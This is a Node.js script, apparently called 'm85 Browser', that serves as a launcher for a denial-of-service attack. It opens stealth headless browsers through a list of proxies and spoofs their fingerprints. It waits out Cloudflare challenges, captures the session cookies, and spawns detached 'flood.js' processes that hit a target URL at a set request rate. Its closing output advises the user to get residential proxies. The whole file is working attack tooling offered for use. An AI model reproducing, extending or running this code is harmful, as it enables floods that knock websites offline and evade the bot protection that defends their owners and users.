const fs = require("fs");
const { spawn } = require("child_process");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");

// Add stealth plugin
puppeteer.use(StealthPlugin());

// Configuration
const MAX_RETRIES = 2;
const TIMEOUT = 45000; // 45 seconds

// Colors for logging
const colors = {
  reset: "\x1b[0m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  cyan: "\x1b[36m",
  pink: "\x1b[35m",
};

function log(type, message) {
  const prefix = `${colors.cyan}[m85|Browser]${colors.reset}`;
  let color = colors.reset;
  let symbol = "ℒ";
  
  if (type === "error") { color = colors.red; symbol = "×"; }
  if (type === "success") { color = colors.green; symbol = "✓"; }
  if (type === "warn") { color = colors.yellow; symbol = "!"; }
  if (type === "info") { color = colors.cyan; symbol = "ℒ"; }
  if (type === "pink") { color = colors.pink; symbol = "★"; }
  
  console.log(`${prefix} ${color}${symbol} ${message}${colors.reset}`);
}

// Check command line arguments
if (process.argv.length < 7) {
  log("error", "Usage: node browser.js <url> <threads> <proxies.txt> <rate> <duration_seconds>");
  log("error", "Example: node browser.js https://example.com 5 proxies.txt 100 60");
  process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = parseInt(process.argv[6]);

// Read proxies
let proxies = [];
try {
  const data = fs.readFileSync(proxyFile, 'utf8');
  proxies = data.trim().split(/\r?\n/).filter(p => p.trim());
  log("success", `Loaded ${proxies.length} proxies`);
} catch (error) {
  log("error", `Cannot read proxy file: ${error.message}`);
  process.exit(1);
}

if (proxies.length === 0) {
  log("error", "No proxies found in file");
  process.exit(1);
}

// Random user agents
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
];

function getRandomUA() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Spoof fingerprint to avoid detection
async function spoofFingerprint(page) {
  await page.evaluateOnNewDocument(() => {
    // Override webdriver
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    
    // Override plugins
    Object.defineProperty(navigator, 'plugins', {
      get: () => [
        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
        { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
        { name: 'Native Client', filename: 'internal-nacl-plugin' }
      ]
    });
    
    // Override languages
    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
    
    // Override hardware concurrency
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
    
    // Override device memory
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
    
    // Override permissions
    const originalQuery = window.navigator.permissions.query;
    window.navigator.permissions.query = (parameters) => (
      parameters.name === 'notifications' ?
        Promise.resolve({ state: Notification.permission }) :
        originalQuery(parameters)
    );
    
    // Add fake chrome.runtime
    window.chrome = {
      runtime: {}
    };
  });
}

// Test if proxy is alive first
async function testProxy(proxyUrl, timeout = 10000) {
  return new Promise((resolve) => {
    const http = require('http');
    const https = require('https');
    
    const url = proxyUrl.startsWith('https') ? proxyUrl.replace('https', 'http') : proxyUrl;
    const [host, port] = url.replace('http://', '').split(':');
    
    const options = {
      host: host,
      port: parseInt(port),
      method: 'CONNECT',
      path: 'sugbo.ph:443',
      timeout: timeout
    };
    
    const req = http.request(options);
    req.on('connect', (res, socket) => {
      socket.destroy();
      resolve(true);
    });
    req.on('error', () => resolve(false));
    req.on('timeout', () => {
      req.destroy();
      resolve(false);
    });
    req.end();
  });
}

// Main browser function
async function openBrowser(proxy, id) {
  const userAgent = getRandomUA();
  const tempDir = `./temp_profile_${id}_${Date.now()}`;
  
  // Format proxy correctly
  let proxyUrl = proxy;
  let hasAuth = false;
  
  // Check if proxy has authentication
  if (proxyUrl.includes('@')) {
    hasAuth = true;
    // Already in format user:pass@host:port
    if (!proxyUrl.startsWith('http://') && !proxyUrl.startsWith('https://')) {
      proxyUrl = `http://${proxyUrl}`;
    }
  } else {
    // No authentication
    if (!proxyUrl.startsWith('http://') && !proxyUrl.startsWith('https://')) {
      proxyUrl = `http://${proxyUrl}`;
    }
  }
  
  log("info", `[${id}] Testing connection to proxy: ${proxy.split('@').pop() || proxy}`);
  
  // Quick proxy test
  const isAlive = await testProxy(proxyUrl, 10000);
  if (!isAlive) {
    log("error", `[${id}] Proxy ${proxy.split('@').pop() || proxy} is not reachable`);
    return {
      success: false,
      proxy: proxy,
      error: "Proxy not reachable",
      errorType: "dead_proxy"
    };
  }
  
  const options = {
    headless: "new",
    ignoreHTTPSErrors: true,
    userDataDir: tempDir,
    args: [
      `--proxy-server=${proxyUrl}`,
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
      '--disable-blink-features=AutomationControlled',
      '--disable-features=IsolateOrigins,site-per-process',
      '--window-size=1920,1080',
      '--lang=en-US',
      `--user-agent=${userAgent}`,
      '--disable-web-security',
      '--allow-running-insecure-content',
      '--disable-background-networking',
      '--disable-default-apps',
      '--disable-extensions',
      '--disable-sync',
      '--disable-translate',
      '--hide-scrollbars',
      '--metrics-recording-only',
      '--mute-audio',
      '--no-first-run',
      '--safebrowsing-disable-auto-update'
    ]
  };
  
  let browser = null;
  
  try {
    log("info", `[${id}] Launching browser with proxy: ${proxy.split('@').pop() || proxy}`);
    
    // Launch browser with timeout
    const browserPromise = puppeteer.launch(options);
    const timeoutPromise = new Promise((_, reject) => 
      setTimeout(() => reject(new Error("Browser launch timeout")), TIMEOUT)
    );
    
    browser = await Promise.race([browserPromise, timeoutPromise]);
    const pages = await browser.pages();
    const page = pages[0];
    
    // Apply fingerprint spoofing
    await spoofFingerprint(page);
    
    // Set timeouts
    page.setDefaultTimeout(TIMEOUT);
    page.setDefaultNavigationTimeout(TIMEOUT);
    
    // Random delay
    await sleep(Math.random() * 2000 + 1000);
    
    log("info", `[${id}] Navigating to ${targetURL}`);
    
    // Navigation with retries for connection reset
    let navigationSuccess = false;
    let lastError = null;
    let pageContent = null;
    
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        const response = await page.goto(targetURL, {
          waitUntil: 'domcontentloaded',
          timeout: TIMEOUT
        });
        
        // Check response status
        if (response && response.status() >= 400) {
          log("warn", `[${id}] HTTP ${response.status()} from target`);
        }
        
        navigationSuccess = true;
        pageContent = await page.content();
        log("success", `[${id}] Navigation succeeded on attempt ${attempt}`);
        break;
        
      } catch (navError) {
        lastError = navError;
        log("warn", `[${id}] Attempt ${attempt}/3 failed: ${navError.message}`);
        
        // Check for specific errors
        if (navError.message.includes('ERR_CONNECTION_RESET')) {
          log("error", `[${id}] Connection reset - proxy unstable`);
          if (attempt === 3) {
            await browser.close();
            try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch(e) {}
            return {
              success: false,
              proxy: proxy,
              error: "Connection reset - unstable proxy",
              errorType: "unstable_proxy"
            };
          }
        } else if (navError.message.includes('ERR_TIMED_OUT')) {
          log("error", `[${id}] Timeout - proxy too slow`);
        } else if (navError.message.includes('ERR_INVALID_AUTH')) {
          log("error", `[${id}] Authentication failed - proxy needs user:pass`);
          await browser.close();
          try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch(e) {}
          return {
            success: false,
            proxy: proxy,
            error: "Authentication required",
            errorType: "auth_required"
          };
        }
        
        if (attempt < 3) {
          await sleep(5000); // Wait longer between retries
          // Reload page if browser still works
          try {
            await page.reload({ timeout: 30000 });
          } catch(e) {}
        }
      }
    }
    
    if (!navigationSuccess) {
      throw lastError || new Error("Navigation failed after 3 attempts");
    }
    
    // Check for Cloudflare challenge
    if (pageContent && (pageContent.includes("challenge-platform") || pageContent.includes("cf-browser-verification") || pageContent.includes("Just a moment"))) {
      log("pink", `[${id}] Cloudflare challenge detected - waiting for bypass`);
      await sleep(10000); // Wait longer for Cloudflare
      
      // Check again after waiting
      const newContent = await page.content();
      if (newContent.includes("Just a moment")) {
        log("error", `[${id}] Cloudflare block persistent - proxy flagged`);
        await browser.close();
        try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch(e) {}
        return {
          success: false,
          proxy: proxy,
          error: "Cloudflare block detected",
          blocked: true
        };
      }
    }
    
    // Get page info
    const title = await page.title();
    const currentUrl = page.url();
    
    log("success", `[${id}] Loaded: ${title} (${currentUrl})`);
    
    // Get cookies
    const cookies = await page.cookies();
    let cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
    
    // If no cookies found, try localStorage
    if (!cookieString) {
      const localStorage = await page.evaluate(() => {
        return JSON.stringify(window.localStorage);
      });
      if (localStorage && localStorage !== '{}') {
        cookieString = `localStorage=${Buffer.from(localStorage).toString('base64')}`;
      }
    }
    
    // Check if flood.js exists
    if (!fs.existsSync("flood.js")) {
      log("error", `[${id}] flood.js not found!`);
      await browser.close();
      try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch(e) {}
      return {
        success: false,
        proxy: proxy,
        error: "flood.js not found"
      };
    }
    
    // Spawn flood.js process
    log("success", `[${id}] ✅ Spawning flood.js with proxy: ${proxy.split('@').pop() || proxy}`);
    
    const floodArgs = [
      "flood.js",
      targetURL,
      "100",        // connections
      "2",          // threads
      proxy,        // proxy (keep original format)
      rates,        // rate
      cookieString, // cookies
      userAgent     // user agent
    ];
    
    log("info", `[${id}] Command: node ${floodArgs.slice(0, 5).join(' ')} ...`);
    
    // Spawn flood.js process detached
    const floodProcess = spawn("node", floodArgs, {
      detached: true,
      stdio: 'ignore',
      windowsHide: true
    });
    
    floodProcess.unref();
    
    log("success", `[${id}] flood.js started with PID: ${floodProcess.pid}`);
    
    // Close browser
    await browser.close();
    
    // Cleanup temp directory
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch(e) {}
    
    return {
      success: true,
      proxy: proxy,
      title: title,
      cookies: cookieString.substring(0, 200) + "...",
      userAgent: userAgent,
      pid: floodProcess.pid
    };
    
  } catch (error) {
    log("error", `[${id}] Failed: ${error.message}`);
    
    if (browser) {
      try { await browser.close(); } catch(e) {}
    }
    
    // Cleanup temp directory
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch(e) {}
    
    // Determine error type
    let errorType = "unknown";
    if (error.message.includes('ERR_CONNECTION_RESET')) errorType = "connection_reset";
    if (error.message.includes('ERR_TIMED_OUT')) errorType = "timeout";
    if (error.message.includes('ERR_INVALID_AUTH')) errorType = "auth_error";
    if (error.message.includes('ECONNREFUSED')) errorType = "connection_refused";
    
    return {
      success: false,
      proxy: proxy,
      error: error.message,
      errorType: errorType
    };
  }
}

// Thread worker with retry
async function worker(proxy, id, retries = 0) {
  const result = await openBrowser(proxy, id);
  
  // Don't retry certain error types
  const noRetryErrors = ['auth_required', 'dead_proxy', 'connection_refused'];
  
  if (!result.success && retries < MAX_RETRIES && !noRetryErrors.includes(result.errorType)) {
    log("warn", `[${id}] Retry ${retries + 1}/${MAX_RETRIES} for ${proxy.split('@').pop() || proxy}`);
    await sleep(3000);
    return worker(proxy, id, retries + 1);
  }
  
  return result;
}

// Store flood processes for tracking
const floodProcesses = [];

// Kill all flood.js processes on exit
function cleanup() {
  log("warn", "Cleaning up flood.js processes...");
  
  if (process.platform === 'win32') {
    const { exec } = require('child_process');
    exec('taskkill /F /IM node.exe /FI "WINDOWTITLE eq flood.js"', (err) => {
      if (err && err.code !== 1) {
        log("error", `Error killing flood.js: ${err.message}`);
      }
    });
  } else {
    const { exec } = require('child_process');
    exec('pkill -f flood.js', (err) => {
      if (err && err.code !== 1) {
        log("error", `Error killing flood.js: ${err.message}`);
      }
    });
  }
  
  log("success", "Cleanup complete");
}

// Main function
async function main() {
  log("info", `╔════════════════════════════════════════╗`);
  log("info", `║     m85 Browser with flood.js         ║`);
  log("info", `╚════════════════════════════════════════╝`);
  log("info", `Target: ${targetURL}`);
  log("info", `Threads: ${threads}`);
  log("info", `Rate: ${rates} req/sec`);
  log("info", `Duration: ${duration} seconds`);
  log("info", `Total proxies: ${proxies.length}`);
  
  // Check if flood.js exists
  if (!fs.existsSync("flood.js")) {
    log("error", "flood.js not found in current directory!");
    log("error", "Make sure flood.js exists before running this script");
    process.exit(1);
  }
  
  // Shuffle proxies for better distribution
  for (let i = proxies.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [proxies[i], proxies[j]] = [proxies[j], proxies[i]];
  }
  
  // Create a queue of proxies
  const proxyQueue = [...proxies];
  let activeThreads = 0;
  let completed = 0;
  let successCount = 0;
  let failCount = 0;
  let blockedCount = 0;
  let unstableCount = 0;
  
  // Process function
  async function processProxy(proxy, id) {
    activeThreads++;
    const result = await worker(proxy, id);
    activeThreads--;
    completed++;
    
    if (result.success) {
      successCount++;
      if (result.pid) floodProcesses.push(result.pid);
      log("success", `[${id}] ✅ SUCCESS - Proxy: ${proxy.split('@').pop() || proxy} | flood.js PID: ${result.pid}`);
    } else if (result.blocked) {
      blockedCount++;
      log("error", `[${id}] 🚫 CLOUDFLARE BLOCK - Proxy: ${proxy.split('@').pop() || proxy}`);
    } else if (result.errorType === "unstable_proxy" || result.errorType === "connection_reset") {
      unstableCount++;
      log("error", `[${id}] ⚠ UNSTABLE PROXY - ${proxy.split('@').pop() || proxy} | ${result.error}`);
    } else {
      failCount++;
      log("error", `[${id}] ❌ FAILED - Proxy: ${proxy.split('@').pop() || proxy} | ${result.error}`);
    }
    
    // Log progress every 5 proxies
    if (completed % 5 === 0 || completed === proxies.length) {
      const successRate = ((successCount / completed) * 100).toFixed(1);
      log("info", `📊 Progress: ${completed}/${proxies.length} | ✅ ${successCount} | 🚫 ${blockedCount} | ⚠ ${unstableCount} | ❌ ${failCount} | (${successRate}% success)`);
    }
    
    // Process next proxy if available
    if (proxyQueue.length > 0) {
      const nextProxy = proxyQueue.shift();
      if (nextProxy) {
        processProxy(nextProxy, id + threads);
      }
    }
  }
  
  // Set up cleanup on exit
  process.on('SIGINT', () => {
    log("warn", "\n⚠ Interrupt received, cleaning up...");
    cleanup();
    setTimeout(() => {
      log("success", "Goodbye!");
      process.exit(0);
    }, 2000);
  });
  
  // Start initial threads
  const startTime = Date.now();
  for (let i = 0; i < Math.min(threads, proxyQueue.length); i++) {
    const proxy = proxyQueue.shift();
    processProxy(proxy, i + 1);
  }
  
  // Wait for duration or completion
  log("info", `⏱ Running for ${duration} seconds...`);
  
  const endTime = startTime + (duration * 1000);
  const interval = setInterval(() => {
    const remaining = Math.ceil((endTime - Date.now()) / 1000);
    if (remaining % 10 === 0 && remaining > 0) {
      log("info", `⏱ Time remaining: ${remaining} seconds`);
    }
  }, 10000);
  
  // Wait until duration expires or all proxies processed
  while (Date.now() < endTime && (proxyQueue.length > 0 || activeThreads > 0)) {
    await sleep(1000);
  }
  
  clearInterval(interval);
  
  // Stop and cleanup
  log("warn", "\n⏱ Time limit reached or all proxies processed, stopping...");
  cleanup();
  
  // Wait for cleanup
  await sleep(3000);
  
  // Final statistics
  log("info", "\n╔════════════════════════════════════════╗");
  log("info", "║           FINAL RESULTS                ║");
  log("info", "╚════════════════════════════════════════╝");
  log("success", `Total proxies tested: ${completed}`);
  log("success", `✅ Successful (flood.js spawned): ${successCount}`);
  log("error", `🚫 Blocked by Cloudflare: ${blockedCount}`);
  log("error", `⚠ Unstable/Connection Reset: ${unstableCount}`);
  log("error", `❌ Failed (other errors): ${failCount}`);
  log("success", `📈 Success rate: ${((successCount / completed) * 100).toFixed(2)}%`);
  
  if (successCount > 0) {
    log("success", `🎯 ${successCount} flood.js processes were spawned successfully`);
  } else {
    log("error", "💀 No successful connections! You need better quality proxies.");
    log("error", "Tips:");
    log("error", "  - Use residential proxies instead of datacenter");
    log("error", "  - Avoid free proxies (they're mostly dead)");
    log("error", "  - Check proxy format: ip:port or user:pass@ip:port");
  }
  
  process.exit(0);
}

// Run main function
main().catch(error => {
  log("error", `Fatal error: ${error.message}`);
  process.exit(1);
});
